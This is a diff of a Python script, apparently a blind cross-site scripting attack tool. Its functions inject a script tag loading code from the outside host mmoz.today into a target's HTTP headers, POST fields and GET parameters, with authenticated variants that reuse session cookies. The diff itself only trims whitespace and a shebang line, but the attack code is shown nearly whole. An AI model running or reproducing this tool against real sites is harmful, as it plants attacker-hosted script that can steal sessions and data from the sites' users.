@@ -1,9 +1,5 @@
-#!/usr/bin/python3
-
 from helperfuncs_lib import Banner
 import requests
-
-
 
 def AttackHeaderValues(target,user):
     payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
@@ -19,9 +15,7 @@ def AttackHeaderValues(target,user):
     print ("[+] Payloads Have a been sended..")
     print ("")
     exit(1)
-
-
-
+    
 # Authenticated Attack HTTP Values
 def AttackHeaderValuesAuth(target,user,cookies):
     payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
@@ -38,12 +32,7 @@ def AttackHeaderValuesAuth(target,user,cookies):
     print ("[+] Payloads Have a been sended..")
     print ("")
     exit(1)
-
-
-
-
-
-
+    
 def AttackPostValues(target,user,post):
     payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
     s = requests.Session()
@@ -53,11 +42,7 @@ def AttackPostValues(target,user,post):
     print ("[+] Payloads Have a been sended..")
     print ("")
     exit(1)
-
-
-
-
-
+    
 # Authenticated Post Value Attack & Attack HTTP Values
 def AttackPostValuesAuth(target,user,post,cookies):
     payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
@@ -75,11 +60,7 @@ def AttackPostValuesAuth(target,user,post,cookies):
     print ("[+] Payloads Have a been sended..")
     print ("")
     exit(1)
-
-
-
-
-
+    
 def AttackGetValues(target,user,get):
     payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
     s = requests.Session()
@@ -89,9 +70,7 @@ def AttackGetValues(target,user,get):
     print ("[+] Payloads Have a been sended..")
     print ("")
     exit(1)
-
-
-
+    
 # Authenticated Get Value Attack & Attack HTTP Values
 def AttackGetValuesAuth(target,user,get,cookies):
     payload = "'><sCriPt sRC=https://mmoz.today/xzort/" + user + "></sCRiPT>"
